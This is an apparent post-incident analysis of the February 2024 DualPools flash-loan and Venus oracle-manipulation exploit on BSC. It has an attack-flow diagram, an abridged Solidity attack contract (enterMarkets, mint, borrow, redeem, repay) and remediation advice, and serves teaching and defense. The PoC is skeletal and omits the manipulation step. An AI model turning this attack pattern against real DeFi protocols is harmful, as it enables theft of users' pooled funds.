# DualPools — Flash Loan-Based Venus Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | DualPools |
| **Chain** | BSC |
| **Loss** | ~$42,000 |
| **Attacker** | Unknown |
| **Vulnerable Contract** | DualPools Liquidity Pool |
| **Root Cause** | The Venus protocol collateral price oracle references AMM spot prices, enabling collateral value manipulation via large swaps within a single block to facilitate excessive borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DualPools_exp.sol) |

---

## 1. Vulnerability Overview

DualPools utilizes the Venus protocol on BSC to manage liquidity. The attacker borrowed a large amount of assets via flash loan, deposited them as collateral into the Venus market, and executed excessive borrowing using manipulated oracle prices. By atomically executing `enterMarkets` → `mint` → `borrow` in sequence, the attacker created a position exceeding the liquidation threshold and drained ~$42K.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: allows immediate borrowing after large collateral deposit within the same TX
interface IVenusComptroller {
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface IVToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
}

// In the flashLoan callback, immediate collateral deposit → borrowing is possible
// If the oracle uses spot price, it can be manipulated

// ✅ Safe code: restricts large-scale mint+borrow within the same block
function mint(uint256 mintAmount) external returns (uint256) {
    require(
        block.number > lastMintBlock[msg.sender] + MIN_BLOCKS,
        "too frequent"
    );
    lastMintBlock[msg.sender] = block.number;
    // ... mint logic
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Execute flash loan (borrow large amount of assets)
  │
  ├─→ [2] Venus enterMarkets (enter collateral market)
  │
  ├─→ [3] vToken.mint() (deposit large amount of collateral)
  │
  ├─→ [4] Oracle price manipulation (based on spot price)
  │
  ├─→ [5] vToken.borrow() (excessive borrowing)
  │
  ├─→ [6] vToken.redeemUnderlying() (withdraw collateral)
  │
  ├─→ [7] vToken.repayBorrow() (partial repayment)
  │
  └─→ [8] Repay flash loan + ~$42K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IVenusComptroller {
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface IVToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
}

contract AttackContract {
    function flashLoanCallback(uint256 amount) external {
        // [1] Enter Venus market
        address[] memory markets = new address[](1);
        markets[0] = address(vToken);
        IVenusComptroller(comptroller).enterMarkets(markets);

        // [2] Deposit large amount of collateral
        IERC20(underlying).approve(address(vToken), amount);
        IVToken(vToken).mint(amount);

        // [3] Manipulate oracle price, then borrow maximum
        (, uint256 liquidity,) = IVenusComptroller(comptroller)
            .getAccountLiquidity(address(this));
        IVToken(targetVToken).borrow(liquidity * 1e18 / price);

        // [4] Withdraw collateral
        IVToken(vToken).redeemUnderlying(amount);

        // [5] Partially repay borrow, then repay flash loan
        IVToken(targetVToken).repayBorrow(partialAmount);
        IERC20(underlying).transfer(lender, amount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based oracle manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (via flash loan) |
| **DApp Category** | Venus fork lending protocol |
| **Impact** | Liquidity pool funds drained via excessive borrowing |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Replace Venus market prices with Chainlink TWAP
2. **Block same-block mint+borrow**: Prevent immediate borrowing after collateral deposit within the same block
3. **Flash loan detection**: Apply additional validation when `borrow` is called inside a flashLoan callback
4. **Maximum single-TX borrow cap**: Limit the maximum amount that can be borrowed in a single transaction

## 7. Lessons Learned

- Venus fork protocols are vulnerable to flash loan manipulation when using spot oracles.
- When the `enterMarkets → mint → borrow` pattern executes within a single TX, collateral requirements can be bypassed.
- The low flash loan cost in the BSC ecosystem makes even small-scale attacks profitable.